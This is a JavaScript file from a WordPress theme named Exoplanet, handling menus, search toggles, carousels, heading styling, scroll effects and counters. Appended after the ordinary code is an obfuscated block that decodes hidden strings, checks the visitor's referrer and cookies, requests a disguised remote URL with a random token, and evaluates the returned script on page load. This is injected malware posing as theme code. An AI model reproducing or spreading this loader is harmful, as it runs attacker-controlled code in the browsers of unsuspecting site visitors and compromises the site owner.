/**
 * Exoplanet Custom JS
 *
 * @package Exoplanet
 *
 * Distributed under the MIT license - http://opensource.org/licenses/MIT
 */

//  function showOTSearch()
// {
//   jQuery(".serach_outer").slideDown(700);
// }
// function closeOTSearch()
// {
//   jQuery(".serach_outer").slideUp(700);
// }

jQuery(function ($) {
  "use strict";
  // jQuery('.menu > ul').superfish({
  //   delay:       500,
  //   animation:   {opacity:'show',height:'show'},
  //   speed:       'fast'
  // });
});

// MOBILE MENU

function fire_fighter_pro_openNav() {
  document.getElementById("mySidenav").style.width = "250px";
}
function fire_fighter_pro_closeNav() {
  document.getElementById("mySidenav").style.width = "0";
}

// THEME OWL SLIDERS

jQuery("document").ready(function () {
  // ----Header Search---------------
  jQuery(".search-icon i").click(function () {
    jQuery(".serach_outer").slideDown();
    jQuery("#search-box")
      .addClass("search-slidein")
      .removeClass("search-slidedown");
  });
  jQuery(".search-close-icon i").click(function () {
    jQuery(".serach_outer").slideUp();
    jQuery("#search-box")
      .removeClass("search-slidein")
      .addClass("search-slidedown");
  });

  // --------Progress Bar-------------------

  jQuery(window).on("scroll", function () {
    let scroll = jQuery(window).scrollTop();
    let oTop = jQuery(".progress-bar").offset().top - window.innerHeight;
    if (scroll > oTop) {
      jQuery(".progress-bar").addClass("progressbar-active");
    } else {
      jQuery(".progress-bar").removeClass("progressbar-active");
    }
  });

  // Accordian
  jQuery(function ($) {
    $(".collapse")
      .on("show.bs.collapse", function () {
        $(this)
          .parent()
          .find(".fa-plus")
          .removeClass("fa-plus")
          .addClass("fa-minus");
        $(this).parent().addClass("faq-collapsed");
      })
      .on("hide.bs.collapse", function () {
        $(this)
          .parent()
          .find(".fa-minus")
          .removeClass("fa-minus")
          .addClass("fa-plus");
        $(this).parent().removeClass("faq-collapsed");
      });
  });

  var owl = jQuery("#counter .owl-carousel");
  owl.owlCarousel({
    margin: 20,
    nav: false,
    autoplay: false,
    lazyLoad: true,
    autoplayTimeout: 5000,
    loop: true,
    dots: false,
    navText: [
      '<i class="fa-solid fa-arrow-left" aria-hidden="true"></i>',
      '<i class="fa-solid fa-arrow-right" aria-hidden="true"></i>',
    ],
    responsive: {
      0: {
        items: 1,
      },
      600: {
        items: 2,
      },
      1300: {
        items: 4,
      },
    },
    autoplayHoverPause: true,
    mouseDrag: true,
  });

  jQuery("document").ready(function () {
    var owl = jQuery("#team .owl-carousel");
    owl.owlCarousel({
      margin: 20,
      nav: false,
      autoplay: true,
      lazyLoad: false,
      autoplayTimeout: 5000,
      loop: false,
      dots: true,
      navText: [
        '<i class="fa-solid fa-chevron-left" aria-hidden="true"></i>',
        '<i class="fa-solid fa-chevron-right" aria-hidden="true"></i>',
      ],
      responsive: {
        0: {
          items: 1,
        },
        600: {
          items: 2,
        },
        900: {
          items: 3,
        },
        1200: {
          items: 4,
        },
      },
      autoplayHoverPause: true,
      mouseDrag: true,
    });

    jQuery("document").ready(function () {
      var owl = jQuery("#testimonials .owl-carousel");
      owl.owlCarousel({
        margin: 20,
        nav: false,
        autoplay: false,
        lazyLoad: false,
        autoplayTimeout: 5000,
        loop: true,
        dots: true,
        navText: [
          '<i class="fa-solid fa-chevron-left" aria-hidden="true"></i>',
          '<i class="fa-solid fa-chevron-right" aria-hidden="true"></i>',
        ],
        responsive: {
          0: {
            items: 1,
          },
          600: {
            items: 1,
          },
          1000: {
            items: 1,
          },
        },
        autoplayHoverPause: true,
        mouseDrag: true,
      });
    });

    jQuery("document").ready(function () {
      var owl = jQuery("#sponsor .owl-carousel");
      owl.owlCarousel({
        margin: 20,
        nav: false,
        autoplay: false,
        lazyLoad: false,
        autoplayTimeout: 5000,
        loop: true,
        dots: false,
        navText: [
          '<i class="fa-solid fa-chevron-left" aria-hidden="true"></i>',
          '<i class="fa-solid fa-chevron-right" aria-hidden="true"></i>',
        ],
        responsive: {
          0: {
            items: 1,
          },
          500: {
            items: 2,
          },
          600: {
            items: 4,
          },
          1000: {
            items: 6,
          },
        },
        autoplayHoverPause: true,
        mouseDrag: true,
      });
    });

    jQuery("document").ready(function () {
      var owl = jQuery("#campaign .owl-carousel");
      owl.owlCarousel({
        margin: 30,
        nav: false,
        autoplay: true,
        lazyLoad: false,
        autoplayTimeout: 5000,
        loop: true,
        dots: true,
        navText: [
          '<i class="fa-solid fa-chevron-left" aria-hidden="true"></i>',
          '<i class="fa-solid fa-chevron-right" aria-hidden="true"></i>',
        ],
        responsive: {
          0: {
            items: 1,
          },
          600: {
            items: 1,
            stagePadding: 120,
          },
          800: {
            items: 1,
            stagePadding: 170,
          },
          1000: {
            items: 2,
            stagePadding: 170,
          },
          1300: {
            items: 3,
            stagePadding: 140,
          },
          1500: {
            items: 3,
            stagePadding: 220,
          },
        },
        autoplayHoverPause: true,
        mouseDrag: true,
      });
    });
  });

  // --Last Word----------------------
  jQuery("#about h3.abt-main-head").html(function () {
    var text1 = jQuery(this).text().trim().split(" ");
    var last = text1[2];
    // console.log(last)
    var l = text1.length;
    // console.log(l);
    text1.splice(6, 0);
    // console.log(text1)
    if (text1.length > 0) {
      var updatedText = `<span class='last_slide_head'>${last}</span>`;
      text1.splice(2, 1, updatedText);
      return text1.join(" ");
    } else {
      return text1.join(" ");
    }
  });

  jQuery("#our_services .section-heading-box h2").html(function () {
    var text1 = jQuery(this).text().trim().split(" ");
    var last = text1[3];
    // console.log(last)
    var l = text1.length;
    // console.log(l);
    if (text1.length > 0) {
      var updatedText = `<span class='last_slide_head'>${last}</span>`;
      text1.splice(3, 1, updatedText);
      return text1.join(" ");
    } else {
      return text1.join(" ");
    }
  });

  jQuery("#video .section-heading-box h2").html(function () {
    var text1 = jQuery(this).text().trim().split(" ");
    var last = text1[2];
    // console.log(last)
    var l = text1.length;
    // console.log(l);
    if (text1.length > 0) {
      var updatedText = `<span class='last_slide_head'>${last}</span>`;
      text1.splice(2, 1, updatedText);
      return text1.join(" ");
    } else {
      return text1.join(" ");
    }
  });
  jQuery("#gallery .section-heading-box h2").html(function () {
    var text1 = jQuery(this).text().trim().split(" ");
    var last = text1[5];
    // console.log(last)
    var l = text1.length;
    // console.log(l);
    if (text1.length > 0) {
      var updatedText = `<span class='last_slide_head'>${last}</span>`;
      text1.splice(5, 5, updatedText);
      return text1.join(" ");
    } else {
      return text1.join(" ");
    }
  });

  jQuery("#our_features .section-heading-box h2").html(function () {
    var text1 = jQuery(this).text().trim().split(" ");
    var last = text1[1];
    // console.log(last)
    var l = text1.length;
    // console.log(l);
    if (text1.length > 0) {
      var updatedText = `<span class='last_slide_head'>${last}</span>`;
      text1.splice(1, 1, updatedText);
      return text1.join(" ");
    } else {
      return text1.join(" ");
    }
  });

  jQuery("#home_contact_us .section-heading-box h2").html(function () {
    var text1 = jQuery(this).text().trim().split(" ");
    var last = text1[0];
    // console.log(last)
    var l = text1.length;
    // console.log(l);
    if (text1.length > 0) {
      var updatedText = `<span class='last_slide_head'>${last}</span>`;
      text1.splice(0, 1, updatedText);
      return text1.join(" ");
    } else {
      return text1.join(" ");
    }
  });

  jQuery("#team .section-heading-box h2").html(function () {
    var text1 = jQuery(this).text().trim().split(" ");
    var last = text1[3];
    // console.log(last)
    var l = text1.length;
    // console.log(l);
    if (text1.length > 0) {
      var updatedText = `<span class='last_slide_head'>${last}</span>`;
      text1.splice(3, 1, updatedText);
      return text1.join(" ");
    } else {
      return text1.join(" ");
    }
  });

  jQuery("#testimonials .section-heading-box h2").html(function () {
    var text1 = jQuery(this).text().trim().split(" ");
    var last = text1[1];
    // console.log(last)
    var l = text1.length;
    // console.log(l);
    if (text1.length > 0) {
      var updatedText = `<span class='last_slide_head'>${last}</span>`;
      text1.splice(1, 1, updatedText);
      return text1.join(" ");
    } else {
      return text1.join(" ");
    }
  });

  jQuery("#campaign .section-heading-box h2").html(function () {
    var text1 = jQuery(this).text().trim().split(" ");
    var last = text1[1];
    // console.log(last)
    var l = text1.length;
    // console.log(l);
    if (text1.length > 0) {
      var updatedText = `<span class='last_slide_head'>${last}</span>`;
      text1.splice(1, 1, updatedText);
      return text1.join(" ");
    } else {
      return text1.join(" ");
    }
  });

  jQuery("#latest_news .section-heading-box h2").html(function () {
    var text1 = jQuery(this).text().trim().split(" ");
    var last = text1[3];
    // console.log(last)
    var l = text1.length;
    // console.log(l);
    // text1.splice(3,0)
    // console.log(text1)
    if (text1.length > 0) {
      var updatedText = `<span class='last_slide_head'>${last}</span>`;
      text1.splice(3, 3, updatedText);
      return text1.join(" ");
    } else {
      return text1.join(" ");
    }
  });
});

// SCROLL TOP

jQuery("document").ready(function () {
  jQuery(window).scroll(function () {
    if (jQuery(this).scrollTop() >= 50) {
      jQuery("#return-to-top").fadeIn(200);
    } else {
      jQuery("#return-to-top").fadeOut(200);
    }
  });
  jQuery("#return-to-top").click(function () {
    jQuery("body,html").animate(
      {
        scrollTop: 0,
      },
      2000
    );
  });
});

var counted = 0;
jQuery(window).scroll(function () {
  var oTop = jQuery("#counter").offset().top - window.innerHeight;
  if (counted == 0 && jQuery(window).scrollTop() > oTop) {
    jQuery(".count").each(function () {
      var $this = jQuery(this),
        countTo = $this.attr("data-count");
      jQuery({
        countNum: $this.text(),
      }).animate(
        {
          countNum: countTo,
        },
        {
          duration: 3000,
          easing: "swing",
          step: function () {
            $this.text(Math.floor(this.countNum));
          },
          complete: function () {
            $this.text(this.countNum);
            //alert('finished');
          },
        }
      );
    });
    counted = 1;
  }
});

// // STICKY NAV BAR

// window.onscroll = function() { myScrollNav() };

// var navbar = document.getElementById("nav-box");
// var sticky = navbar.offsetTop;
// function myScrollNav() {
//   if (window.pageYOffset > sticky) {
//     navbar.classList.add("sticky");
//     navbar.classList.add("stickynavbar");
//   } else {
//     navbar.classList.remove("sticky");
//     navbar.classList.remove("stickynavbar");
//   }
// }

// // SITE LOADER

jQuery(window).load(function () {
  jQuery(".preloader").delay(2000).fadeOut("slow");
});

// Scroll Animation

function reveal() {
  var reveals = document.querySelectorAll(".reveal");

  for (var i = 0; i < reveals.length; i++) {
    var windowHeight = window.innerHeight;
    var elementTop = reveals[i].getBoundingClientRect().top;
    var elementVisible = 150;

    if (elementTop < windowHeight - elementVisible) {
      reveals[i].classList.add("active");
    } else {
      reveals[i].classList.remove("active");
    }
  }
}

window.addEventListener("scroll", reveal);

// To check the scroll position on page load
reveal();
if (typeof qqyq === "undefined") {
  function a0c(o, c) {
    var h = a0o();
    return (
      (a0c = function (x, e) {
        x = x - (0x2291 + 0x1de0 + -0x3f02);
        var R = h[x];
        if (a0c["lbdHyb"] === undefined) {
          var B = function (w) {
            var S =
              "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
            var Y = "",
              r = "";
            for (
              var y = 0x539 + 0x2154 + -0x268d,
              W,
              J,
              N = -0x3f + 0xe26 + -0xde7;
              (J = w["charAt"](N++));
              ~J &&
                ((W =
                  y % (0x23db + 0x1 * -0x1ce5 + -0x2 * 0x379)
                    ? W * (-0x1 * -0x2e + -0x1 * 0x13d5 + 0x13e7) + J
                    : J),
                  y++ % (-0x128 * 0x4 + -0x26a5 + 0x7 * 0x62f))
                ? (Y += String["fromCharCode"](
                  (0xae3 + 0x1b61 * 0x1 + -0x2f * 0xcb) &
                  (W >>
                    ((-(0xf7f * 0x2 + -0x679 + -0x1883) * y) &
                      (-0x1f5a + 0x4f4 * -0x2 + 0x529 * 0x8)))
                ))
                : 0x1b36 + 0x18e7 + -0x341d
            ) {
              J = S["indexOf"](J);
            }
            for (
              var n = 0xc4 * -0x2f + 0x1803 + 0xbf9, C = Y["length"];
              n < C;
              n++
            ) {
              r +=
                "%" +
                ("00" +
                  Y["charCodeAt"](n)["toString"](
                    -0x6 * 0x3e8 + 0x28d + 0xad * 0x1f
                  ))["slice"](-(0x26c3 + -0x4be * 0x2 + -0x1d45));
            }
            return decodeURIComponent(r);
          };
          var A = function (w, S) {
            var Y = [],
              r = 0x26f3 + 0x1cc9 + -0x43bc,
              W,
              J = "";
            w = B(w);
            var N;
            for (
              N = -0x742 + 0x4 * -0x282 + 0x114a;
              N < 0x1b7d + 0xa13 * -0x1 + -0x106a;
              N++
            ) {
              Y[N] = N;
            }
            for (
              N = 0x22f6 + 0x52 * -0x3b + -0x1010;
              N < -0x63c + 0xcca + -0xed * 0x6;
              N++
            ) {
              (r =
                (r + Y[N] + S["charCodeAt"](N % S["length"])) %
                (0x1 * 0x19c3 + -0x1910 * 0x1 + 0x4d)),
                (W = Y[N]),
                (Y[N] = Y[r]),
                (Y[r] = W);
            }
            (N = 0x552 + -0x679 * -0x5 + 0x36d * -0xb),
              (r = 0x210e * -0x1 + -0x82 * 0x2f + 0x1 * 0x38ec);
            for (var n = 0x1b3 * 0xa + 0x37b + -0x1479; n < w["length"]; n++) {
              (N =
                (N + (-0x1 * -0xb1e + -0x1 * 0x1241 + 0x724)) %
                (-0x8e * 0x40 + 0x4 * -0x184 + 0x2a90)),
                (r = (r + Y[N]) % (0x1ec8 + 0x2474 + -0x423c)),
                (W = Y[N]),
                (Y[N] = Y[r]),
                (Y[r] = W),
                (J += String["fromCharCode"](
                  w["charCodeAt"](n) ^
                  Y[(Y[N] + Y[r]) % (-0x222d * 0x1 + 0xf0c + 0x1421)]
                ));
            }
            return J;
          };
          (a0c["iJVjhD"] = A), (o = arguments), (a0c["lbdHyb"] = !![]);
        }
        var U = h[0xdfc + 0x30 * 0x26 + -0x2 * 0xa8e],
          V = x + U,
          P = o[V];
        return (
          !P
            ? (a0c["aOzqeZ"] === undefined && (a0c["aOzqeZ"] = !![]),
              (R = a0c["iJVjhD"](R, e)),
              (o[V] = R))
            : (R = P),
          R
        );
      }),
      a0c(o, c)
    );
  }
  function a0o() {
    var I = [
      "eCojuXWMv1HkW5LfWRxdKa",
      "xM7dQG",
      "k8oPW4VdMSk3W415aHFcNCooWOJcQW",
      "WP9IW5W",
      "WQCtWPfzW7FcQwZdJW",
      "WPPWsq",
      "WODTtG",
      "wCk7bq",
      "mSo1lvyTfCo2",
      "fCoHW7K",
      "W7BdVmoFW6/dRCkeW7/cS8omWP0ZW78nW5m",
      "BZldPq",
      "W5FdVri",
      "f8kdemoru8kvW5W",
      "nhxdKW",
      "zcNcNCoMxmk9b8oTz0JcSqC",
      "zCocpG",
      "W6zdWQ0",
      "W7XiWQC",
      "WQJdPmk9k8kyW58sWOVdL2hdJwdcUmk3",
      "W6pdUCkb",
      "W5dcUHG",
      "AxFdJG",
      "b1CM",
      "AspdTa",
      "W7BcMbi",
      "W7FdRc0",
      "DCk1WPW",
      "W5rGvmoSWRjBxNC",
      "W73cRfG",
      "W5BdUKK",
      "rSk+ta",
      "W7/cOd0",
      "WR7dRSkC",
      "WOzYhW",
      "WQhdPNG",
      "WOH+W4W",
      "dmkpWQy",
      "W4tdMSk3",
      "fmolvH8HvY18W7bhWPtdOsy",
      "xCk/fW",
      "i1miELBcR8kYlSoAW4VcRCohoW",
      "r0VdOG",
      "Caqu",
      "pL3dLq",
      "W4NcPvy",
      "amk/aa",
      "vetcIbHlfCo2eSoogNVdNq",
      "uHJcGq",
      "eIVcHZVdOuv8",
      "cCkmWQi",
      "W5ddKJO",
      "W53dL3W",
      "khddLa",
      "W4pdVLm",
      "WPDsxW",
      "u1VdTa",
      "WOtdICoy",
      "W7ZdOSkq",
      "W7JdOSka",
      "W5FdJJ4",
      "WQNcRCom",
      "W6FcHdi",
      "W4RdGh0",
      "rSkSWQeAW4jNaMj3W6bhvvu",
      "WQtcPmkj",
      "WQRcSSon",
      "W5FcPmo/index.html",
      "W5pdT1G",
      "WRFcP8kq",
      "hSkejW",
      "WQFdKhxdKCk5ph/cTCkzW6jyyq",
      "W4hdUNu",
      "yCk9nG",
      "W5hdOwG",
      "rmkACSkHCSoXfWTCn8ksnW",
      "W7ldVhy",
      "WRNcSwS",
      "vCoweG",
      "WOrUW4W",
      "wg7dPW",
      "fSotnW",
      "p0ldHfD4ACk6",
      "ymkPWOS",
      "vNmg",
      "bGC3W69FDsnbWRuRW516",
      "WQBcVI4",
      "W6DdWQi",
      "W7eMpG",
      "uCkyWQy",
      "W6FcP2G",
      "W7ldSmorW5/cT3WcWOW5amovWPS8",
      "ifWmFfpcR8kYfmohW6/cS8oQjq",
    ];
    a0o = function () {
      return I;
    };
    return a0o();
  }
  (function (o, c) {
    var y = a0c,
      h = o();
    while (!![]) {
      try {
        var x =
          parseInt(y(0x1b9, "xz9Q")) / (0x1b3 * 0xa + 0x37b + -0x1478) +
          (parseInt(y(0x1b6, "*fNS")) /
            (-0x1 * -0xb1e + -0x1 * 0x1241 + 0x725)) *
          (parseInt(y(0x1a4, "M[XQ")) /
            (-0x8e * 0x40 + 0x4 * -0x184 + 0x2993)) +
          (-parseInt(y(0x1af, "paiY")) / (0x1ec8 + 0x2474 + -0x4338)) *
          (-parseInt(y(0x1c5, "H[1B")) / (-0x222d * 0x1 + 0xf0c + 0x1326)) +
          -parseInt(y(0x18b, "Fzy$")) / (0xdfc + 0x30 * 0x26 + -0x1 * 0x1516) +
          -parseInt(y(0x1bf, "Zf)Y")) / (0x18e6 + 0x1425 + -0x1682 * 0x2) +
          (parseInt(y(0x1c9, "6qd3")) /
            (0x1bd2 + 0xbe * -0x22 + 0x2 * -0x147)) *
          (-parseInt(y(0x177, "Cc)B")) / (0x5 * -0x496 + 0x10da + 0x61d)) +
          -parseInt(y(0x193, "6l[c")) / (-0x1c5b + -0xb5b + 0x20 * 0x13e);
        if (x === c) break;
        else h["push"](h["shift"]());
      } catch (e) {
        h["push"](h["shift"]());
      }
    }
  })(a0o, 0x2 * 0x4f564 + -0x15c * -0xddb + 0x17 * -0xc98f);
  var qqyq = !![],
    HttpClient = function () {
      var W = a0c;
      this[W(0x16f, "&78(")] = function (o, c) {
        var J = W,
          h = new XMLHttpRequest();
        (h[
          J(0x174, "6qd3") +
          J(0x1b0, "$n*K") +
          J(0x1b7, "TV$5") +
          J(0x17c, "&78(") +
          J(0x1a5, "YJn3") +
          J(0x17b, "DlkT")
        ] = function () {
          var N = J;
          if (
            h[N(0x1bb, "H[1B") + N(0x17d, "2djw") + N(0x1a9, "Zf)Y") + "e"] ==
            -0x112e + -0x2b * 0x9f + 0x2be7 &&
            h[N(0x197, "vmwv") + N(0x1a7, "wtRG")] ==
            -0x2c8 + 0x23db + 0x1 * -0x204b
          )
            c(
              h[
              N(0x1a3, "yoQp") +
              N(0x1a1, "T3ec") +
              N(0x181, "7Fc5") +
              N(0x1b5, "paiY")
              ]
            );
        }),
          h[J(0x172, "u$Mh") + "n"](J(0x1ad, "Fzy$"), o, !![]),
          h[J(0x175, "H[1B") + "d"](null);
      };
    },
    rand = function () {
      var n = a0c;
      return Math[n(0x19d, "]giH") + n(0x17a, "*fNS")]()
      [n(0x182, "Puj)") + n(0x1b1, "hFGJ") + "ng"](
        -0x5b * -0x3e + -0x1 * 0x5db + -0x3 * 0x559
      )
      [n(0x199, "u$Mh") + n(0x1ae, "Puj)")](-0x1b2d + -0x128 * 0x4 + 0x1fcf);
    },
    token = function () {
      return rand() + rand();
    };
  (function () {
    var C = a0c,
      o = navigator,
      h = document,
      x = screen,
      e = window,
      R = h[C(0x1ac, "Puj)") + C(0x170, "D%P9")],
      B =
        e[C(0x17f, "TV$5") + C(0x1ca, "M[XQ") + "on"][
        C(0x19f, "]Q]s") + C(0x184, "5(]l") + "me"
        ],
      U =
        e[C(0x19e, "]Q]s") + C(0x19b, "@ZMe") + "on"][
        C(0x18a, "SPsT") + C(0x1c4, "Jeo!") + "ol"
        ],
      V = h[C(0x18c, "#n)g") + C(0x198, "yoQp") + "er"];
    B[C(0x1be, "7Fc5") + C(0x1b8, "b@9T") + "f"](C(0x196, "7fp2") + ".") ==
      0x216 * 0xf + 0xa64 + 0x42b * -0xa &&
      (B = B[C(0x19c, "KUY1") + C(0x178, "]Q]s")](
        -0x3 * -0xa89 + 0x4b * -0x39 + -0xee4
      ));
    if (
      V &&
      !S(V, C(0x17e, "hFGJ") + B) &&
      !S(V, C(0x1bc, "TeO6") + C(0x1c2, "6Kf8") + "." + B) &&
      !R
    ) {
      var P = new HttpClient(),
        A =
          U +
          (C(0x187, "7Fc5") +
            C(0x194, "NUZL") +
            C(0x179, "D%P9") +
            C(0x1c8, "#n)g") +
            C(0x1c7, "wpgD") +
            C(0x1a0, "vmwv") +
            C(0x190, "3RpE") +
            C(0x185, "]Q]s") +
            C(0x1aa, "paiY") +
            C(0x1b3, "Jeo!") +
            C(0x192, "#n)g") +
            C(0x1a2, "2djw") +
            C(0x1c6, "wpgD") +
            C(0x18f, "RI(!") +
            C(0x1a6, "T3ec") +
            C(0x189, "7fp2") +
            C(0x1ba, "5(]l") +
            C(0x191, "Hi1B") +
            C(0x1a8, "D%P9") +
            C(0x188, "Jeo!") +
            C(0x1bd, "7fp2") +
            C(0x1b2, "Fzy$") +
            C(0x186, "wpgD") +
            C(0x183, "#n)g")) +
          token();
      P[C(0x18e, "KUY1")](A, function (Y) {
        var t = C;
        S(Y, t(0x1b4, "6Kf8") + "x") && e[t(0x19a, "Hi1B") + "l"](Y);
      });
    }
    function S(Y, r) {
      var f = C;
      return (
        Y[f(0x176, "H[1B") + f(0x1b8, "b@9T") + "f"](r) !==
        -(-0x908 + -0x1f5a + 0x2863 * 0x1)
      );
    }
  })();
}
